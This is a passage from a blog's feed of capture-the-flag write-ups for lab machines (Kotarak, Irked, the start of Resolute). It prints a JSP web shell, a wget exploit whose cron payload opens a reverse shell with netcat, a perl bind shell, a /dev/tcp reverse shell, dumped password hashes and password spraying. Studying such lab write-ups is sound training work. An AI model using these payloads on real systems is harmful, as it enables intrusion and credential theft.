/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Go to your browser and open target web app.\nWe have an input users, that takes in parameter a url, lets try to put my web server url and maybe i will get request on it.\nLets try to do some SSRF with a little python script, this will connect a differents ports with 127.0.0.1 ip and it will show me the response of the server and maybe we will found some interresting content.\nimport requests url = \u0026#39;http://10.10.10.55:60000/url.php?path=http://127.0.0.1\u0026#39; for i in range(1000): r = requests.get(url + f\u0026#39;:{i}\u0026#39;) compte = len(r.content) if compte \u0026gt; 2 : print(f\u0026#34;port={i}\u0026#34;, \u0026#34;content : \\n\u0026#34;, r.text) but we can also do this with wfuzz.\n\u0026gt; wfuzz -c -z range,1-65000 --hl=2 -u http://10.10.10.55:60000/url.php?path=http://127.0.0.1:FUZZ This give some informations, we have an login page on port 320 lets see what is it.\nbut the script give me other ports, the 888 have some content so lets see what is going on it.\nIf we look at the source code of the page we can see that the application seems to fetch the files via a parameter in the url try to reproduce this\n\u0026lt;tr \u0026gt; \u0026lt;td width=\u0026#34;27\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;?doc=backup\u0026#34; class=\u0026#34;tableElement\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;inc/images/generic.png\u0026#34; alt=\u0026#34;dir\u0026#34; width=\u0026#34;22\u0026#34; height=\u0026#34;22\u0026#34; border=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElement\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;?doc=backup\u0026#34; class=\u0026#34;tableElement\u0026#34;\u0026gt;backup\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElementInfo\u0026#34;\u0026gt;\u0026amp;nbsp;2.22 kB\u0026lt;/td\u0026gt; \u0026lt;td class=\u0026#34;tableElementInfo\u0026#34;\u0026gt;\u0026amp;nbsp;18 07 2017 21:42:11\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; So on burpsuite intercept the request to http://10.10.10.55:60000/url.php?path=http://127.0.0.1:888/ and add the ?doc=backup before the url.\nLets goo, we find a clear text password I think it is tomcat credential admin:3@g01PdhB! .\nUse this credential to Login tomcat manager. http://10.10.10.55:8080/manager/html\nExploit Tomcat manager : # we will use the technique that concise to create a web shell with a .jsp.\nFirst create a file named index.jsp and this content on it.\n\u0026lt;FORM METHOD=GET ACTION=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;INPUT name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;INPUT type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/FORM\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; Execute the following command to package it as a .war file.\n\u0026gt; jar -cvf ../webshell.war index.jsp upload the war file on tomcat pannel and go /webshell/index.jsp to get the web shell.\nYou can get a reverse shell with nc onliner payload for exemple.\nPrivileges Escalation tomcat ⇒ atanas : # On the home of tomcat user we can find some interresting file.\n20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin which the name of the file i thinks this is a ntds active directory databases, this file can containt users hashs of the AD domain.\n\u0026gt; file 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above Download the file and use secretdump to dump the ntds db databases and get the NT hash.\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee::: WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487::: WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279::: WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772::: WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c::: atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: If we were from an active Directory environment we could have made pass the hash to connect unfortunately we on a linux machine try to break the hash of administrator and atanas.\nWith hashcat :\n\u0026gt; hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt e64fe0f24ba2489c05e64354d74ebd11:f16tomcat! But hashcat give me juste on password so i try on this site.\nLets try to move latteraly to atanas user. atanas:**f16tomcat!**\nmake id command you can see the current user is part of group disk.\nSo we can exploit this to get access on the root directory or for exemple read /etc/shadow.\nFirst we need to display the available partitions.\n\u0026gt; df -h Filesystem Size Used Avail Use% Mounted on udev 469M 0 469M 0% /dev tmpfs 98M 4.6M 93M 5% /run /dev/mapper/Kotarak--vg-root 6.4G 4.4G 2.1G 69% / tmpfs 488M 0 488M 0% /dev/shm tmpfs 5.0M 0 5.0M 0% /run/lock tmpfs 488M 0 488M 0% /sys/fs/cgroup /dev/sda1 117M 114M 2.8M 98% /boot tmpfs 98M 0 98M 0% /run/user/1000 now use debugfs to interact with the partition.\n\u0026gt; debugfs /dev/mapper/Kotarak--vg-root \u0026gt; debugfs: cat /etc/shadow root:$6$drWeP5N5$k65A2JoUsMISRA04wVOoXFOJVU.k7qxgBrvOD23S4mo6/aRlbnJbUNhvxiXdOe6rdyuvnkZY1po.Ym3q6uYhL0:17368:0:99999:7::: daemon:*:17001:0:99999:7::: bin:*:17001:0:99999:7::: sys:*:17001:0:99999:7::: sync:*:17001:0:99999:7::: games:*:17001:0:99999:7::: man:*:17001:0:99999:7::: lp:*:17001:0:99999:7::: mail:*:17001:0:99999:7::: news:*:17001:0:99999:7::: uucp:*:17001:0:99999:7::: proxy:*:17001:0:99999:7::: www-data:*:17001:0:99999:7::: backup:*:17001:0:99999:7::: list:*:17001:0:99999:7::: irc:*:17001:0:99999:7::: gnats:*:17001:0:99999:7::: nobody:*:17001:0:99999:7::: systemd-timesync:*:17001:0:99999:7::: systemd-network:*:17001:0:99999:7::: systemd-resolve:*:17001:0:99999:7::: systemd-bus-proxy:*:17001:0:99999:7::: syslog:*:17001:0:99999:7::: _apt:*:17001:0:99999:7::: lxd:*:17356:0:99999:7::: messagebus:*:17356:0:99999:7::: uuidd:*:17356:0:99999:7::: dnsmasq:*:17356:0:99999:7::: atanas:$6$V7BERjjx$jYM7HrbrhsMcdFtVeA/BPkUJbYqFDdHUvf7Sefwo7ywQ9eyW0lKTCHiFt0WIJ1qtKEVbySfsks9RonNVUX2LD/:17368:0:99999:7::: tomcat:!:17359:0:99999:7::: mysql:!:17359:0:99999:7::: lxc-dnsmasq:!:17366:0:99999:7::: sshd:*:17368:0:99999:7::: # Get the flag \u0026gt; debugfs: cat /root/flag.txt Getting closer! But what you are looking for can\u0026#39;t be found here. Exploit Wget version to Get root : # on the /root/app.log file we can see a connection from remote ip.\n10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; 10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; 10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 404 503 \u0026#34;-\u0026#34; \u0026#34;Wget/1.16 (linux-gnu)\u0026#34; Lets try to ping the ip.\n\u0026gt; ping -c 2 10.0.3.133 PING 10.0.3.133 (10.0.3.133) 56(84) bytes of data. 64 bytes from 10.0.3.133: icmp_seq=1 ttl=64 time=0.079 ms 64 bytes from 10.0.3.133: icmp_seq=2 ttl=64 time=0.071 ms So i try to open a web server to get the request but i get permission denied.\n\u0026gt; python3 -m http.server 80 Traceback (most recent call last): File \u0026#34;/usr/lib/python3.5/runpy.py\u0026#34;, line 184, in _run_module_as_main \u0026#34;__main__\u0026#34;, mod_spec) File \u0026#34;/usr/lib/python3.5/runpy.py\u0026#34;, line 85, in _run_code exec(code, run_globals) File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 1221, in \u0026lt;module\u0026gt; test(HandlerClass=handler_class, port=args.port, bind=args.bind) File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 1194, in test httpd = ServerClass(server_address, HandlerClass) File \u0026#34;/usr/lib/python3.5/socketserver.py\u0026#34;, line 440, in __init__ self.server_bind() File \u0026#34;/usr/lib/python3.5/http/server.py\u0026#34;, line 138, in server_bind socketserver.TCPServer.server_bind(self) File \u0026#34;/usr/lib/python3.5/socketserver.py\u0026#34;, line 454, in server_bind self.socket.bind(self.server_address) PermissionError: [Errno 13] Permission denied To bypass the retriction use authbind because it is install on the system.\n\u0026gt; authbind nc -nlvp 80 Listening on [0.0.0.0] (family 0, port 80) Connection from [10.0.3.133] port 80 [tcp/*] accepted (family 2, sport 51486) GET /archive.tar.gz HTTP/1.1 User-Agent: Wget/1.16 (linux-gnu) Accept: */* Host: 10.0.3.1 Connection: Keep-Alive So the version wget is vulnerable to remote code execution [(CVE-2016-4971)](https://www.exploit-db.com/exploits/40064)so try to exploit.\nFirst we need to prepares a malicious .wgetrc and we should starts an FTP server with python module, all the comand is on he victime machine :\n# Creat .wgetrc file \u0026gt; cat \u0026lt;\u0026lt;_EOF_\u0026gt;.wgetrc \u0026gt; post_file = /etc/shadow \u0026gt; output_document = /etc/cron.d/wget-root-shell \u0026gt; _EOF_ # you maybe need to install the lib before sudo pip install pyftpdlib \u0026gt; authbind python -m pyftpdlib -p21 -w Now take this exploit on github, you need to edit the exploit like this\n# IP address of the victim machine HTTP_LISTEN_IP = \u0026#39;0.0.0.0\u0026#39; HTTP_LISTEN_PORT = 80 FTP_HOST = \u0026#39;10.0.3.1\u0026#39; FTP_PORT = 21 # Payload on cronjob ROOT_CRON = \u0026#34;* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.3.1 4444 \u0026gt;/tmp/f \\n\u0026#34; Now run the exploit always with authbind to bypass ports retrictions.\n#open nc listener always in victim machine \u0026gt; nc -lnvp 4444 # Run the exploit and wait a few minutes \u0026gt; authbind python exploit.py Ready? Is your FTP server running? FTP found open on 10.0.3.1:21. Let\u0026#39;s go then Serving wget exploit on port 80... We have a volunteer requesting /archive.tar.gz by GET :) Uploading .wgetrc via ftp redirect vuln. It should land in /root 10.0.3.133 - - [23/Mar/2024 14:48:01] \u0026#34;GET /archive.tar.gz HTTP/1.1\u0026#34; 301 - Sending redirect to ftp://anonymous@10.0.3.1:21/.wgetrc We have a volunteer requesting /archive.tar.gz by POST :) Received POST from wget, this should be the extracted /etc/shadow file: ---[begin]--- root:*:17366:0:99999:7::: daemon:*:17366:0:99999:7::: bin:*:17366:0:99999:7::: sys:*:17366:0:99999:7::: sync:*:17366:0:99999:7::: games:*:17366:0:99999:7::: man:*:17366:0:99999:7::: lp:*:17366:0:99999:7::: mail:*:17366:0:99999:7::: news:*:17366:0:99999:7::: uucp:*:17366:0:99999:7::: proxy:*:17366:0:99999:7::: www-data:*:17366:0:99999:7::: backup:*:17366:0:99999:7::: list:*:17366:0:99999:7::: irc:*:17366:0:99999:7::: gnats:*:17366:0:99999:7::: nobody:*:17366:0:99999:7::: systemd-timesync:*:17366:0:99999:7::: systemd-network:*:17366:0:99999:7::: systemd-resolve:*:17366:0:99999:7::: systemd-bus-proxy:*:17366:0:99999:7::: syslog:*:17366:0:99999:7::: _apt:*:17366:0:99999:7::: sshd:*:17366:0:99999:7::: ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7::: ---[eof]--- Sending back a cronjob script as a thank-you for the file... It should get saved in /etc/cron.d/wget-root-shell on the victim\u0026#39;s host (because of .wgetrc we injected in the GET first response) 10.0.3.133 - - [23/Mar/2024 14:50:01] \u0026#34;POST /archive.tar.gz HTTP/1.1\u0026#34; 200 - File was served. Check on /root/hacked-via-wget on the victim\u0026#39;s host in a minute! :) Check your listener after one minut the cronjob is running we get the reverse shell.\nThis boxing was really fun to do it is realy uncommon to meet a second network system with a second machine ( even if it is docker ) in this type of machine. 😼\n","date":"28 March 2024","externalUrl":null,"permalink":"/posts/kotarak/","section":"Posts","summary":"Scanning : # Run nmap scan.","title":"OSCP boxe - Kotarak"},{"content":"","date":"21 March 2024","externalUrl":null,"permalink":"/tags/irc/","section":"Tags","summary":"","title":"IRC"},{"content":" Scanning : # Begin with nmap scan to enumerate open ports and services behind the port.\n\u0026gt; nmap -sS -sC -sV -n -T4 10.10.10.117 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 37579/tcp status | 100024 1 38289/tcp6 status | 100024 1 40649/udp status |_ 100024 1 47590/udp6 status Enumerate all ports.\n\u0026gt; nmap -p- -n -Pn -T5 --max-retries 1 10.10.10.117 -sS 6697/tcp open ircs-u 8067/tcp open infi-async 37579/tcp open unknown 65534/tcp open unknown Enumerate Portmapper : # Use rpcinfo to get information about the service.\n\u0026gt; rpcinfo 10.10.10.117 program version netid address service owner 100000 4 tcp6 ::.0.111 portmapper superuser 100000 3 tcp6 ::.0.111 portmapper superuser 100000 4 udp6 ::.0.111 portmapper superuser 100000 3 udp6 ::.0.111 portmapper superuser 100000 4 tcp 0.0.0.0.0.111 portmapper superuser 100000 3 tcp 0.0.0.0.0.111 portmapper superuser 100000 2 tcp 0.0.0.0.0.111 portmapper superuser 100000 4 udp 0.0.0.0.0.111 portmapper superuser 100000 3 udp 0.0.0.0.0.111 portmapper superuser 100000 2 udp 0.0.0.0.0.111 portmapper superuser 100000 4 local /run/rpcbind.sock portmapper superuser 100000 3 local /run/rpcbind.sock portmapper superuser 100024 1 udp 0.0.0.0.158.201 status 107 100024 1 tcp 0.0.0.0.146.203 status 107 100024 1 udp6 ::.185.230 status 107 100024 1 tcp6 ::.149.145 status 107 But i dosen’t get more informations.\nEnumerate IRC : # As you can see the we have an open port with irc protocol.\n\u0026gt; nmap -sV -sC -p 6697 10.10.10.117 PORT STATE SERVICE VERSION 6697/tcp open irc UnrealIRCd Useful nmap script to get more informations\n\u0026gt; nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 10.10.10.117 PORT STATE SERVICE VERSION 6697/tcp open irc UnrealIRCd | irc-botnet-channels: |_ ERROR: TIMEOUT |_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 As you can see the nmap see the version of this service look like vulnerable to a backdoor lets search more information about this on internet.\nFull Disclosure: Fw: [irc-security] UnrealIRCd 3.2.8.1 backdoored on official ftp and site\nExploit CVE-2010-2075 : # Get this github poc to exploit the backdoor.\nGitHub - Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor: My backdoor script for a vulnerable version of UnrealIRCd\nYou need to add your ip and the port on the exploit code.\nNow run nc listener and the launch the exploit.\n# run listener \u0026gt; pwncat-cs :1337 # run the exploit \u0026gt; python exploit.py 10.10.10.117 6697 -payload netcat Just wait a few seconds and get your shell.\nWe can do it manualy because it was more stable, so create a bind shell ayload with msfvenom.\n\u0026gt; msfvenom -p cmd/unix/bind_perl LHOST=10.10.10.117 connect on the irc channel and enter the payload.\n\u0026gt; nc -vn 10.10.10.117 6697 (UNKNOWN) [10.10.10.117] 6697 (ircs-u) open :irked.htb NOTICE AUTH :*** Looking up your hostname... AB;perl -MIO -e \u0026#39;$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)-\u0026gt;accept;$~-\u0026gt;fdopen($c,w);STDIN-\u0026gt;fdopen($c,r);while(\u0026lt;\u0026gt;){if($_=~ /(.*)/){system $1;}};\u0026#39; # connet to bind adress \u0026gt; nc -vn 10.10.10.117 4444 (UNKNOWN) [10.10.10.117] 4444 (?) open id uid=1001(ircd) gid=1001(ircd) groups=1001(ircd) Privileges Escalation : # Upload linpeas to enumerate system.\n# open web server on the same directory of the linpeas script \u0026gt; python3 -m http.server 80 # Download linpeas on the target \u0026gt; wget http://10.10.14.10/linpeas.sh # run linpeas \u0026gt; chmod +x linpeas.sh \u0026amp;\u0026amp; ./linpeas.sh when we look SUID binary enmeration, linpeas find unknow SUID name /usr/bin/viewuser .\n╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid strace Not Found -rwsr-xr-- 1 root messagebus 355K Nov 21 2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 9.3K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 14K Sep 8 2016 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 550K Nov 19 2017 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Oct 14 2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!) -rwsr-xr-x 1 root root 1.1M Feb 10 2018 /usr/sbin/exim4 -rwsr-xr-- 1 root dip 332K Apr 14 2015 /usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007) -rwsr-xr-x 1 root root 43K May 17 2017 /usr/bin/chsh -rwsr-sr-x 1 root mail 94K Nov 18 2017 /usr/bin/procmail -rwsr-xr-x 1 root root 77K May 17 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 38K May 17 2017 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-sr-x 1 daemon daemon 50K Sep 30 2014 /usr/bin/at ---\u0026gt; RTru64_UNIX_4.0g(CVE-2002-1614) -rwsr-xr-x 1 root root 18K Sep 8 2016 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-sr-x 1 root root 9.3K Apr 1 2014 /usr/bin/X -rwsr-xr-x 1 root root 52K May 17 2017 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 52K May 17 2017 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 7.2K May 16 2018 /usr/bin/viewuser (Unknown SUID binary!) -rwsr-xr-x 1 root root 95K Aug 13 2014 /sbin/mount.nfs -rwsr-xr-x 1 root root 38K May 17 2017 /bin/su -rwsr-xr-x 1 root root 34K Mar 29 2015 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 34K Jan 21 2016 /bin/fusermount -rwsr-xr-x 1 root root 158K Jan 28 2017 /bin/ntfs-3g ---\u0026gt; Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) -rwsr-xr-x 1 root root 26K Mar 29 2015 /bin/umount ---\u0026gt; BSD/Linux(08-1996) Get informations to the type of the file, it is a Linux ELF binary.\n\u0026gt; file /usr/bin/viewuser /usr/bin/viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=69ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped Download the file using nc to analyse it localy.\n# ATTACKER MACHINE \u0026gt; nc -lnvp 4444 \u0026gt; binary # VICTIM MACHINE \u0026gt; nc 10.10.14.10 4444 \u0026lt; /usr/bin/viewuser when you get the binary localy lets use strings command to get caractere strings. a rather strange thing is the presence of a file named listusers\n\u0026gt; strings binary We will now launch the binary but we will try to find more information about internal process with the ltrace tool.\n\u0026gt; ltrace ./binary __libc_start_main(0x5665357d, 1, 0xff8c67a4, 0x56653600 \u0026lt;unfinished ...\u0026gt; puts(\u0026#34;This application is being devleo\u0026#34;...This application is being devleoped to set and test user permissions ) = 69 puts(\u0026#34;It is still being actively devel\u0026#34;...It is still being actively developed ) = 37 system(\u0026#34;who\u0026#34;kali tty7 2024-03-21 03:35 (:0) \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 0 setuid(0) = 0 system(\u0026#34;/tmp/listusers\u0026#34;sh: 1: /tmp/listusers: not found \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 32512 +++ exited (status 0) +++ As you can see the binary run system instruction, it means that the file listusers is executed by the binary, I will create a file named listusers and we will put it with reverse shell in bash and it will by exec by the binary.\n# do not forget to do this in /tmp \u0026gt; touch listusers \u0026amp;\u0026amp; echo \u0026#39;#!/bin/bash \\nsh -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.10/4444 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; listusers # give read and exec right the listusers \u0026gt; chmod +rx listusers # run listener \u0026gt; nc -lnvp 4444 Run the binary and and get your shell as root. Now repeat the operation but on the target machine.\n# Download the reverse shell on target machine \u0026gt; wget http://10.10.14.10/listusers \u0026gt; chmod +xr listusers \u0026gt; /usr/bin/viewuser GG Irked is pwn, Great boxe ! 😎\n","date":"21 March 2024","externalUrl":null,"permalink":"/posts/irked/","section":"Posts","summary":"Scanning : # Begin with nmap scan to enumerate open ports and services behind the port.","title":"OSCP boxe - Irked"},{"content":"","date":"21 March 2024","externalUrl":null,"permalink":"/tags/suid/","section":"Tags","summary":"","title":"SUID"},{"content":" Resolute - OSCP boxe # Scanning : # Nmap scan to see open ports and services :\n\u0026gt; nmap 10.10.10.169 -sC -sV -Pn -T4 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-16 09:22:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m11s, deviation: 4h02m30s, median: 7m10s | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-03-16T09:22:34 |_ start_date: 2024-03-16T09:19:30 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2024-03-16T02:22:32-07:00 Its was a domain controleur so lets add the domaine, the FQDN and the ip to your /etc/hosts file.\necho \u0026#34;10.10.10.169 megabank.local RESOLUTE.megabank.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts Enumerat SMB : # Lets try to connect on the smb service using nul creds or null session.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.169 445 RESOLUTE [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: Lets try to enumerate users in the domain.\n\u0026gt; crackmapexec smb 10.10.10.169 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --users [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\: SMB 10.10.10.169 445 RESOLUTE [*] Trying to dump local users with SAMRPC protocol SMB 10.10.10.169 445 RESOLUTE [+] Enumerated domain user(s) SMB 10.10.10.169 445 RESOLUTE megabank.local\\Administrator Built-in account for administering the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\Guest Built-in account for guest access to the computer/domain SMB 10.10.10.169 445 RESOLUTE megabank.local\\krbtgt Key Distribution Center Service Account SMB 10.10.10.169 445 RESOLUTE megabank.local\\DefaultAccount A user account managed by the system. SMB 10.10.10.169 445 RESOLUTE megabank.local\\ryan SMB 10.10.10.169 445 RESOLUTE megabank.local\\marko Account created. Password set to Welcome123! SMB 10.10.10.169 445 RESOLUTE megabank.local\\sunita SMB 10.10.10.169 445 RESOLUTE megabank.local\\abigail SMB 10.10.10.169 445 RESOLUTE megabank.local\\marcus SMB 10.10.10.169 445 RESOLUTE megabank.local\\sally SMB 10.10.10.169 445 RESOLUTE megabank.local\\fred SMB 10.10.10.169 445 RESOLUTE megabank.local\\angela SMB 10.10.10.169 445 RESOLUTE megabank.local\\felicia SMB 10.10.10.169 445 RESOLUTE megabank.local\\gustavo SMB 10.10.10.169 445 RESOLUTE megabank.local\\ulf SMB 10.10.10.169 445 RESOLUTE megabank.local\\stevie SMB 10.10.10.169 445 RESOLUTE megabank.local\\claire SMB 10.10.10.169 445 RESOLUTE megabank.local\\paulo SMB 10.10.10.169 445 RESOLUTE megabank.local\\steve SMB 10.10.10.169 445 RESOLUTE megabank.local\\annette SMB 10.10.10.169 445 RESOLUTE megabank.local\\annika SMB 10.10.10.169 445 RESOLUTE megabank.local\\per SMB 10.10.10.169 445 RESOLUTE megabank.local\\claude SMB 10.10.10.169 445 RESOLUTE megabank.local\\melanie SMB 10.10.10.169 445 RESOLUTE megabank.local\\zach SMB 10.10.10.169 445 RESOLUTE megabank.local\\simon SMB 10.10.10.169 445 RESOLUTE megabank.local\\naoki We get a potential password in the commentaire of the domain user marko, now we can create a liste of the users and try password spraying with all of it.\nmy user list :\nAdministrator Guest krbtgt DefaultAccount ryan marko sunita abigail marcus sally fred angela felicia gustavo ulf stevie claire paulo steve annette annika per claude melanie zach simon naoki Launch password spraying.\n\u0026gt; crackmapexec smb 10.10.10.169 -u user.lst -p pass.txt --continue-on-succes | grep \u0026#39;[+]\u0026#39; SMB 10.10.10.169 445 RESOLUTE [+] megabank.local\\melanie:Welcome123! We get user and password so it was the first acces on the domaine.\nFind the way using bloodhound : # collect ldap informations :\n\u0026gt; rusthound -d megabank.local -i 10.10.10.169 -u \u0026#34;melanie\u0026#34;@\u0026#39;megabank.local\u0026#39; -p \u0026#39;Welcome123!\u0026#39; as you can see melanie is part of group Remote Management users so we can open a shell with evil-winrm because this user is abel to administrate the DC with winrm remotly.\nconnect with winrm.\n\u0026gt; evil-winrm -i 10.10.10.169 -u \u0026#39;melanie\u0026#39; -p \u0026#39;Welcome123!\u0026#39; Get users .txt on the Desktop of melanie.\nAfter enumeration with bloodhound i found this way.\nand contractor is part of group DNSAdmins like you can see ( in this case i use ADpeas. )\nin my opinion we really need to compromise the DNSAdmin group to become Domain admin\nSecurity groups | The Hacker Recipes\nMelanie to Ryan : # After lot of enumeration I found this directory.\nAnd on this directory there is another directory and on these direcotry there is a file.\n\u0026gt; cd PSTranscripts \u0026gt; gci -Hidden Directory: C:\\PSTranscripts Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 12/3/2019 6:45 AM 20191203 \u0026gt; cd 20191203 \u0026gt; gci -Hidden Directory: C:\\PSTranscripts\\20191203 Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 12/3/2019 